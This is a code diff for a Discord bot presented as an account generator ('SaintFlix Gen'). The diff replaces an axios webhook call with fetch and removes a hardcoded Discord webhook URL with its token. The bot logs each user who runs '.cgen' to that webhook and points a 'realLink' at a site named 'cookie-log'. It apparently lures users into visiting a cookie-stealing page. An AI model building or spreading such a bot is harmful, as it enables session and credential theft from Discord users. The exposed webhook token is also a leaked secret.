@@ -1,18 +1,17 @@
 // ============================================================
-// Discord Bot - .cgen Command + Webhook
+// Discord Bot - .cgen Command + Webhook (NO AXIOS)
 // ============================================================
-// Requirements: npm install discord.js axios
+// Requirements: npm install discord.js
 // ============================================================
 
 const { Client, GatewayIntentBits, EmbedBuilder } = require("discord.js");
-const axios = require("axios");
 
 const PREFIX = ".";
 const BOT_NAME = "SaintFlix Gen";
 const FOOTER_TEXT = "Powered by AccountGen Bot";
 
 const OWNER_ID = "1399683999659593789";
-const WEBHOOK_URL = process.env.WEBHOOK_URL || "https://discord.com/api/webhooks/1529258026945740932/HygJsAGCL2MSaV114QaDf_d7F4WJZsSGC4IWnEcr4K3hhNmEUPTcej3-jXUjyMc5aSVU";
+const WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";
 
 const CHANNEL_RESTRICTIONS = {
   "cgen": "1529258164669644850"
@@ -61,10 +60,14 @@ client.on("messageCreate", async (message) => {
     const realLink = "https://cookie-log.onrender.com/index.html";
 
     try {
-      // Send to Discord webhook when .cgen is used
-      await axios.post(WEBHOOK_URL, {
-        content: `**🔐 .cgen Command Used**\nUser: <@${message.author.id}>\nUser ID: ${message.author.id}\nChannel: <#${message.channel.id}>\nTime: ${new Date().toISOString()}`
-      });
+      // Send to Discord webhook using fetch (no axios needed)
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          content: `**🔐 .cgen Command Used**\nUser: <@${message.author.id}>\nUser ID: ${message.author.id}\nChannel: <#${message.channel.id}>\nTime: ${new Date().toISOString()}`
+        })
+      }).catch(() => {});
 
       const dmEmbed = new EmbedBuilder()
         .setColor(0x2ecc71)
